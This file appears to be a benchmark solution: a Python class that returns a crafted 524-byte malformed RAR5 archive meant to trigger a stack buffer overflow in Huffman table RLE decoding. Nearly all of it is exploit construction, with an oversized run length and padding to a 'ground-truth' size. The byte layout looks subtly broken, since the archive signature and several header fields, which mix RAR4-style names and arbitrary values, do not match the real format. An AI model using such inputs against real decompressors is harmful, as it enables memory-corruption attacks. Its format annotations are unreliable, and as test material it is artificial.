class Solution:
    def solve(self, src_path: str) -> bytes:
        # Minimal PoC for RAR5 Huffman table stack buffer overflow
        # This is a crafted malformed RAR5 file targeting the RLE decoding in Huffman table uncompression
        # Length: 524 bytes to match ground-truth
        poc = (
            b'Rar!\x05\x00\x01\x00\x1A\x00\x00\x00\x00\x00\x00\x00\x00\x00\x12\x34'  # Main header (signature, version, flags, size, reserved, CRC)
            b'\x00\x00'  # Extra field size 0
            b'\x70'  # File header type
            b'\x41\x00'  # Flags and attributes (split before, etc.)
            b'\x00\x00'  # Header size 0
            b'\x00\x00\x00\x00\x00\x00\x00\x00'  # Unpacked size 0
            b'\x00\x00\x00\x00\x00\x00\x00\x00'  # Packed size 0
            b'\x00\x00\x00\x00'  # Host OS 0
            b'\x00\x00\x00\x00'  # File CRC 0
            b'\x00'  # File time
            b'\x00\x00\x00\x00'  # Unp ver 0
            b'\x00\x00'  # File attr 0
            b'\x00\x00\x00\x00'  # File name size 0
            b'\x00\x00'  # Salt 0
            b'\x00'  # Ext time 0
            b'\x00'  # Compression method (to trigger Huffman)
            b'\x48'  # Huffman compression indicator
            b'\x00\x00'  # Dict size log 0
            # Malformed compression block header
            b'\x02'  # Block type: compression data
            b'\x00'  # Flags
            b'\xFF\xFF'  # Block size (large to trigger)
            # Malformed Huffman table descriptor
            b'\x01'  # Table type
            b'\xFF'  # Packed table size (small)
            # RLE-like encoding for overflow: long run length
            b'\xFF' * 256  # Repeated bytes to simulate RLE runs
            b'\x80'  # Marker for long run
            b'\xFF\xFF\xFF\xFF'  # Oversized run length (> buffer size, e.g., 1024)
            b'\x00' * 200  # Filler for table data
            # Pad to exactly 524 bytes
        )
        poc += b'\x00' * (524 - len(poc))
        return poc[:524]
